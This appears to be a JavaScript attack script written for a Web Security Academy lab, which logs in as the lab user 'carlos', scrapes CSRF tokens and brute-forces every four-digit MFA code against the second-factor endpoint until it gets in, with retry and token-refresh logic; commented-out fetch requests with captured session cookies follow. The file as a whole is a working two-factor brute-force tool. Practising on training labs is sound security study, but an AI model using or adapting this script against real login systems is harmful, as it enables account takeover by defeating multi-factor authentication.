import axios, { AxiosResponse } from "axios";
import { parse } from "node-html-parser";
// import fetch from "node-fetch";
axios.defaults.withCredentials = true;

const subdomain = "0abd00cf03ea85d3c074977400a400b0";
const loginURL = `https://${subdomain}.web-security-academy.net/login`;
const mfaCodeVerificationURL = `https://${subdomain}.web-security-academy.net/login2`;

const getNewCSRFFromLogin = async () => {
  let loginPageCSRFCookie;
  let mfaCodeCSRFCookie;
  try {
    try {
      const loginPageGetResponse = await axios.get(loginURL);
      loginPageCSRFCookie =
        loginPageGetResponse.headers["set-cookie"][0].split(";")[0];
      const loginPageGetResponseHTML = parse(loginPageGetResponse.data);
      const loginPageGetCSRFInputElement =
        loginPageGetResponseHTML.querySelector('[name="csrf"]');
      const loginPageCSRF = loginPageGetCSRFInputElement.attrs.value;
      // console.log(loginPageGetResponse);
      const loginPagePostResponse = await axios.post(
        loginURL,
        `csrf=${loginPageCSRF}&username=carlos&password=montoya`,
        {
          withCredentials: true,
          maxRedirects: 0,
          headers: {
            crossDomain: true,
            "content-type": "application/x-www-form-urlencoded",
            cookie: loginPageCSRFCookie,
            accept:
              "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9,es;q=0.8",
            "cache-control": "max-age=0",
            "sec-ch-ua":
              '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"macOS"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            // "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            Referer: `https://${subdomain}.web-security-academy.net/login`,
            // "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
    } catch (e) {
      console.log(e.response);
      mfaCodeCSRFCookie = e.response.headers["set-cookie"][0].split(";")[0];
    }

    const mfaCodePageGetResponse = await axios.get(mfaCodeVerificationURL, {
      headers: { cookie: mfaCodeCSRFCookie, crossDomain: true },
      withCredentials: true,
    });
    console.log("test");
    const loginPagePostResponseHTML = parse(mfaCodePageGetResponse.data);
    const loginPagePostCSRFInputElement =
      loginPagePostResponseHTML.querySelector('[name="csrf"]');
    const mfaCSRF = loginPagePostCSRFInputElement.attrs.value;

    return [mfaCSRF, mfaCodeCSRFCookie];
  } catch (e) {
    console.log(e);
    throw e;
  }
};

const attack = async () => {
  let [mfaCSRF, mfaCodeCSRFCookie] = await getNewCSRFFromLogin();
  console.log("test");
  console.log(mfaCSRF);
  for (let i = 0; i < 10000; i++) {
    let formattedMFACode = i.toString();
    if (i < 10) {
      formattedMFACode = "000" + formattedMFACode;
    } else if (i < 100) {
      formattedMFACode = "00" + formattedMFACode;
    } else if (i < 1000) {
      formattedMFACode = "0" + formattedMFACode;
    }

    console.log("Attempting MFA Code: ", formattedMFACode);

    try {
      const response = await axios.post(
        mfaCodeVerificationURL,
        `csrf=${mfaCSRF}&mfa-code=${formattedMFACode}`,
        {
          headers: {
            Cookie: mfaCodeCSRFCookie,
          },
        }
      );
      console.log(response.data);

      if (response.status === 302 || response.data.includes("Your email is")) {
        console.log(
          "You broke through Carlos' account using MFA code: ",
          formattedMFACode
        );
        break;
      }
    } catch (e) {
      if (e.code === "ECONNRESET") {
        i -= 1;
        console.log("Retrying due to broken connection");
      } else if (e.response.data.includes("Invalid CSRF token")) {
        [mfaCSRF, mfaCodeCSRFCookie] = await getNewCSRFFromLogin();
        i -= 1;
      } else {
        console.log(e);
        throw e;
      }
    }
  }
};

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

try {
  attack();
} catch (e) {
  console.log(e);
  throw e;
}

// fetch("https://ac481f011e3c3a1ec00189bd00ce00f4.web-security-academy.net/login2", {
//   "headers": {

//   },
//   "body": "mfa-code=fdsafasdfaf",
//   "method": "POST"
// });

// fetch(
//   "https://ac231f5c1f3bd2fcc0fa9c8b00ed0071.web-security-academy.net/login",
//   {
//     headers: {
//       accept:
//         "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
//       "accept-language": "en-US,en;q=0.9,es;q=0.8",
//       "cache-control": "max-age=0",
//       "sec-ch-ua":
//         '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
//       "sec-ch-ua-mobile": "?0",
//       "sec-ch-ua-platform": '"macOS"',
//       "sec-fetch-dest": "document",
//       "sec-fetch-mode": "navigate",
//       "sec-fetch-site": "same-origin",
//       "sec-fetch-user": "?1",
//       "upgrade-insecure-requests": "1",
//       cookie: "session=8R7Nns62LLsnX3sTGFRjAPkvQcbALb20",
//       Referer:
//         "https://ac231f5c1f3bd2fcc0fa9c8b00ed0071.web-security-academy.net/login2",
//       "Referrer-Policy": "strict-origin-when-cross-origin",
//     },
//     body: null,
//     method: "GET",
//   }
// );

// fetch(
//   "https://ac231f5c1f3bd2fcc0fa9c8b00ed0071.web-security-academy.net/login",
//   {
//     headers: {
//       accept:
//         "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
//       "accept-language": "en-US,en;q=0.9,es;q=0.8",
//       "cache-control": "max-age=0",
//       "content-type": "application/x-www-form-urlencoded",
//       "sec-ch-ua":
//         '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
//       "sec-ch-ua-mobile": "?0",
//       "sec-ch-ua-platform": '"macOS"',
//       "sec-fetch-dest": "document",
//       "sec-fetch-mode": "navigate",
//       "sec-fetch-site": "same-origin",
//       "sec-fetch-user": "?1",
//       "upgrade-insecure-requests": "1",
//       cookie: "session=8R7Nns62LLsnX3sTGFRjAPkvQcbALb20",
//       Referer:
//         "https://ac231f5c1f3bd2fcc0fa9c8b00ed0071.web-security-academy.net/login",
//       "Referrer-Policy": "strict-origin-when-cross-origin",
//     },
//     body: "csrf=RoYJxqCVl6TPVoYsPGPrT6Ko4BZY8r6e&username=carlos&password=montoya",
//     method: "POST",
//   }
// );

// fetch(
//   "https://ac231f5c1f3bd2fcc0fa9c8b00ed0071.web-security-academy.net/login2",
//   {
//     headers: {
//       accept:
//         "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
//       "accept-language": "en-US,en;q=0.9,es;q=0.8",
//       "cache-control": "max-age=0",
//       "sec-ch-ua":
//         '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
//       "sec-ch-ua-mobile": "?0",
//       "sec-ch-ua-platform": '"macOS"',
//       "sec-fetch-dest": "document",
//       "sec-fetch-mode": "navigate",
//       "sec-fetch-site": "same-origin",
//       "sec-fetch-user": "?1",
//       "upgrade-insecure-requests": "1",
//       cookie: "session=2A8tmUWiPODrzMFt4f2dOynQu9sJJ4Pu",
//       Referer:
//         "https://ac231f5c1f3bd2fcc0fa9c8b00ed0071.web-security-academy.net/login",
//       "Referrer-Policy": "strict-origin-when-cross-origin",
//     },
//     body: null,
//     method: "GET",
//   }
// );
